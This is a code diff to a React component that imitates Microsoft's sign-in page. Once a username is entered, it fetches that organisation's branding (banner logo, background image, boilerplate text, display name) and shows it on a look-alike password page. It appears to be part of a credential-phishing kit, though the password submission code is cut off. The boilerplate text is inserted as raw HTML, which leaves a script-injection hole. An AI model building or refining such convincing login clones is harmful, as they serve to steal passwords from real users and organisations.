@@ -39,6 +39,17 @@ function SignInOptions() {
   );
 }
 
+function BoilerplateText(props: { text?: string }) {
+  return (
+    <div
+      id="idBoilerPlateText"
+      className="wrap-content boilerplate-text ext-boilerplate-text"
+      hidden={!props.text}
+      dangerouslySetInnerHTML={{ __html: props.text ?? "" }}
+    ></div>
+  );
+}
+
 function UsernamePage(props: {
   username: string;
   boilerplateText?: string;
@@ -124,13 +135,7 @@ function UsernamePage(props: {
                 </div>
               </div>
             </div>
-            <div
-              id="idBoilerPlateText"
-              className="wrap-content boilerplate-text ext-boilerplate-text"
-              hidden={!props.boilerplateText}
-            >
-              <p>{props.boilerplateText}</p>
-            </div>
+            <BoilerplateText text={props.boilerplateText} />
           </div>
         </div>
       </div>
@@ -239,13 +244,7 @@ function PasswordPage(props: {
                 </div>
               </div>
             </div>
-            <div
-              id="idBoilerPlateText"
-              className="wrap-content boilerplate-text ext-boilerplate-text"
-              hidden={!props.boilerplateText}
-            >
-              <p>{props.boilerplateText}</p>
-            </div>
+            <BoilerplateText text={props.boilerplateText} />
           </div>
         </div>
       </div>
@@ -305,10 +304,12 @@ function LightboxTemplateContainer(props: {
           name="f1"
           noValidate
           spellCheck="false"
-          method="post"
-          target="_top"
           autoComplete="off"
           className="provide-min-height"
+          onSubmit={(e) => {
+            e.preventDefault();
+            e.stopPropagation();
+          }}
         >
           <div className="login-paginated-page">
             <div id="lightboxTemplateContainer" className="provide-min-height">
@@ -324,6 +325,10 @@ function LightboxTemplateContainer(props: {
                     aria-label="Hintergrundbild der Organisation"
                   />
                 </div>
+
+                {props.backgroundImage ? (
+                  <div className="background-overlay ext-background-overlay"></div>
+                ) : null}
               </div>
               <div className="outer">
                 <div className="template-section main-section">
@@ -337,14 +342,22 @@ function LightboxTemplateContainer(props: {
                           >
                             <div className="lightbox-cover"></div>
                             <div>
-                              <img
-                                className="logo"
-                                role="img"
-                                src={
-                                  props.bannerLogo ?? "ms/microsoft-logo.svg"
-                                }
-                                alt="Microsoft"
-                              />
+                              {props.bannerLogo ? (
+                                <img
+                                  id="bannerLogo"
+                                  className="banner-logo ext-banner-logo"
+                                  role="img"
+                                  src={props.bannerLogo}
+                                  alt="Logo des Organisationsbanners"
+                                />
+                              ) : (
+                                <img
+                                  className="logo"
+                                  role="img"
+                                  src="ms/microsoft-logo.svg"
+                                  alt="Microsoft"
+                                />
+                              )}
                             </div>
                             {props.children}
                           </div>
@@ -375,23 +388,18 @@ export default function MSConvergedSignInPage() {
 
   const onUsernameSubmit = async () => {
     console.log("Username submitted:", username);
-    const data = await branding.mutateAsync({ username })
-    console.log("Branding Data gotten:", data);
-    
-    //setPage("password");
+    const data = await branding.mutateAsync({ username });
+    console.log("Branding Data:", data);
+
+    setPage("password");
   };
-
-  const backgroundProxyUrl = branding.data?.branding?.backgroundImage
-    ? `/api/assetProxy?url=${encodeURIComponent(branding.data.branding.backgroundImage)}`
-    : undefined;
-
-  console.log("Branding Data:", branding.data);
 
   return (
     <LightboxTemplateContainer
       signInOptions={page === "username"}
       footer
-      backgroundImage={backgroundProxyUrl}
+      bannerLogo={branding.data?.assets?.BannerLogo}
+      backgroundImage={branding.data?.assets?.Illustration}
     >
       {page === "username" ? (
         <UsernamePage
@@ -402,9 +410,9 @@ export default function MSConvergedSignInPage() {
       ) : null}
       {page === "password" ? (
         <PasswordPage
-          username={username}
+          username={branding.data?.userDisplayName ?? username}
           password={password}
-          boilerplateText="BoilerPlateText here"
+          boilerplateText={branding.data?.boilerplateText}
           onPasswordChange={setPassword}
           onBack={() => setPage("username")}
           onSubmit={() => {
